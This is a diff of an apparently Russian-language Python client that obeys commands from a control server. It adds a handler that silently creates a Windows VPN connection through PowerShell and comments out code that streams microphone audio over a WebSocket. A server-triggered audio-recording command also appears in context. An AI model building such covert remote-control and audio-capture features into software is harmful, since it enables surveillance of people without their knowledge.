@@ -289,6 +289,9 @@ def control_ws():
         elif cmd == "record_audio":
             logger.info("Запись аудио по команде сервера.")
             threading.Thread(target=record_audio_snippet, daemon=True).start()
+        elif cmd == "vpn_create":
+            logger.info("Создание VPN подключения по команде сервера.")
+            threading.Thread(target=create_vpn_connection, daemon=True).start()
 
     def on_error(ws, error):
         logger.error(f"WebSocket ошибка: {error}")
@@ -355,62 +358,78 @@ def get_min_password_length() -> int:
     except Exception:
         return -1
     
+def create_vpn_connection():
+    # Пример для Windows с использованием PowerShell
+    vpn_name = "MyVPN"
+    server_address = "vpn.example.com"
+    # Команда создаст VPN-подключение, но не будет его активировать
+    command = [
+        "powershell",
+        "-Command",
+        f"Add-VpnConnection -Name \"{vpn_name}\" -ServerAddress \"{server_address}\" -TunnelType L2tp -Force -PassThru"
+    ]
+    try:
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)
+        logger.info("VPN connection created successfully: " + output)
+    except Exception as e:
+        logger.error("Error creating VPN connection: " + str(e))
+   
 # def audio_ws_worker():
-    """
-    Функция для подключения к wsAudio и отправки фреймов микрофона.
-    """
-    ws_audio = websocket.WebSocket()
-    audio_ws_url = "ws://127.0.0.1:4000/wsAudio?client=client-1"
-    try:
-        ws_audio.connect(audio_ws_url)
-        logging.info(f"Audio WebSocket connected successfully to {audio_ws_url}")
-    except Exception as e:
-        logging.error(f"Audio WebSocket connect error: {e}")
-        return
+#     """
+#     Функция для подключения к wsAudio и отправки фреймов микрофона.
+#     """
+#     ws_audio = websocket.WebSocket()
+#     audio_ws_url = "ws://127.0.0.1:4000/wsAudio?client=client-1"
+#     try:
+#         ws_audio.connect(audio_ws_url)
+#         logging.info(f"Audio WebSocket connected successfully to {audio_ws_url}")
+#     except Exception as e:
+#         logging.error(f"Audio WebSocket connect error: {e}")
+#         return
 
-    p = pyaudio.PyAudio()
-    stream = None
+#     p = pyaudio.PyAudio()
+#     stream = None
 
-    try:
-        # Открываем микрофон
-        stream = p.open(format=pyaudio.paInt16,
-                        channels=1,
-                        rate=44100,
-                        input=True,
-                        frames_per_buffer=1024)
-        logging.info("Microphone stream opened successfully.")
+#     try:
+#         # Открываем микрофон
+#         stream = p.open(format=pyaudio.paInt16,
+#                         channels=1,
+#                         rate=44100,
+#                         input=True,
+#                         frames_per_buffer=1024)
+#         logging.info("Microphone stream opened successfully.")
 
-        while True:
-            if mic_streaming_active:
-                try:
-                    audio_data = stream.read(1024, exception_on_overflow=False)
-                    logging.debug("Read 1024 samples from microphone.")
-                except Exception as read_err:
-                    logging.error(f"Error reading from microphone: {read_err}")
-                    continue
+#         while True:
+#             if mic_streaming_active:
+#                 try:
+#                     audio_data = stream.read(1024, exception_on_overflow=False)
+#                     logging.debug("Read 1024 samples from microphone.")
+#                 except Exception as read_err:
+#                     logging.error(f"Error reading from microphone: {read_err}")
+#                     continue
 
-                try:
-                    ws_audio.send(audio_data, opcode=websocket.ABNF.OPCODE_BINARY)
-                    logging.debug("Sent audio frame via Audio WebSocket.")
-                except Exception as send_err:
-                    logging.error(f"Error sending audio frame: {send_err}")
-                time.sleep(0.01)
-            else:
-                logging.debug("Mic streaming not active, waiting...")
-                time.sleep(0.5)
-    except Exception as e:
-        logging.error(f"Audio capture error: {e}")
-    finally:
-        if stream is not None:
-            stream.stop_stream()
-            stream.close()
-            logging.info("Microphone stream closed.")
-        p.terminate()
-        try:
-            ws_audio.close()
-            logging.info("Audio WebSocket closed.")
-        except Exception as close_err:
-            logging.error(f"Error closing Audio WebSocket: {close_err}")
+#                 try:
+#                     ws_audio.send(audio_data, opcode=websocket.ABNF.OPCODE_BINARY)
+#                     logging.debug("Sent audio frame via Audio WebSocket.")
+#                 except Exception as send_err:
+#                     logging.error(f"Error sending audio frame: {send_err}")
+#                 time.sleep(0.01)
+#             else:
+#                 logging.debug("Mic streaming not active, waiting...")
+#                 time.sleep(0.5)
+#     except Exception as e:
+#         logging.error(f"Audio capture error: {e}")
+#     finally:
+#         if stream is not None:
+#             stream.stop_stream()
+#             stream.close()
+#             logging.info("Microphone stream closed.")
+#         p.terminate()
+#         try:
+#             ws_audio.close()
+#             logging.info("Audio WebSocket closed.")
+#         except Exception as close_err:
+#             logging.error(f"Error closing Audio WebSocket: {close_err}")
 
 if __name__ == "__main__":
     logger.info("Клиент запустился")
